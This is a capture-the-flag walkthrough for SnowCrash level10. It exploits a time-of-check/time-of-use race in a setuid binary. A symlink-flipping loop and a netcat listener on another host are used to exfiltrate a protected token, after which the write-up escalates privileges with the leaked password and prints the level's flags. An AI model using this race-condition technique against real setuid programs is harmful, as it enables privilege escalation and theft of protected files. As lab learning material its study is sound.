# level10

```
level10@SnowCrash:~$ ls -l
total 16
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token
```

Testing files
```
level10@SnowCrash:~$ ./level10 
./level10 file host
	sends file to host if you have access to it
level10@SnowCrash:~$ ./level10 token localhost
You don't have access to token
level10@SnowCrash:~$ touch /tmp/flag && ./level10 /tmp/flag localhost
Connecting to localhost:6969 .. Unable to connect to host localhost
```

Ok, let's make a serv on host:
```
host$> nc -l 6969
.*( )*.
```

Hmm.. now let's try to access that token file
By using strace we can see that the program is using `access` to check for right, let's try to provoc a 'TOCTOU':

Create a link and create the 'trick':
```
level10@SnowCrash:~$ touch public
level10@SnowCrash:~$ while true; do ln -sf token flip; ln -sf public flip; done &
```

Let's try to abuse:
```
level10@SnowCrash:~$ while true; do ./level10 flip $HOST_IP; done
```

Then nc in loop on host and then you may get that result o/
```
host$>nc -l 6969
.*( )*.
woupa2yuojeeaaed06riuj63c
```

HOURRA !
```
level10@SnowCrash:~$ su flag10
Password: woupa2yuojeeaaed06riuj63c
Don't forget to launch getflag !
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```
